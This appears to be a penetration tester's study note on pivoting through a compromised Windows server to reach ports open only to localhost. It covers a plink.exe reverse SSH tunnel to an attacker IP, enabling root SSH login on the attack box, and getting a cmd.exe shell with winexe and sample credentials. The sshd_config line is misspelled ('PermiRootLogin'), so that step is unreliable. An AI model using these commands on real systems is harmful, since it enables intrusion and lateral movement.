-- -
Writing this for situations where you want to attack services on ports that are only available to local host. So:
1. You get a foothold on a server
2. You [[Dark Arts/Privesc/Windows/Enumeration/Network#^cc03c5|Network Enum]] and find ports open only to localhost
So from here you will need to forward your traffic through the server to get access to those ports. 
##### Setup SSH on target servera
You can skip this step if SSH is setup on the server. This is for most situations where the windows server does not have SSH up. 
1. [Download Plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
2. [[Windows|File Transfer]] plink.exe to target server. 
3. Config SSH on attackbox:
```bash
sudo vim /etc/ssh/sshd_config

# look for line:
# PermitRootLogin prohibit-password

# uncomment and change to:
PermiRootLogin yes

# then save

# Check ssh status
sudo systemctl status ssh
sudo service ssh status

# start if not enabled
sudo systemctl start ssh
sudo service ssh start

# if it is enabled/started previously, restart it
sudo systemctl restart ssh
sudo service ssh restart
```
4. Setup port forward on target:
```powershell
# I still don't have my mind completely wrapped around this, but I believe it port forwards to internally avaialble port and connects back to attack box via ssh. 

# for the credentials, use the credentials of your account on the attackbox
# -R: Port to forward to, i.e. the port open only to localhost you want to access
# in this example, we are forwarding traffic from 445 externally to 445 open internally. 
plink.exe -l <username> -pw <password> -R <port>:127.0.0.1:<port> <attack ip>
plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.5
plink.exe -l n0ctxs -pw kali -R 445:127.0.0.1:445 10.10.14.5
```
5. Use `winexe` to run linux commands via windows.
```bash
# Try to get shell with creds
# on shell gotten through plink.exe:
winexe -U <username>%<password> //127.0.0.1 "cmd.exe"
winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"

# note: you may need to try it multiple times before it works. 
```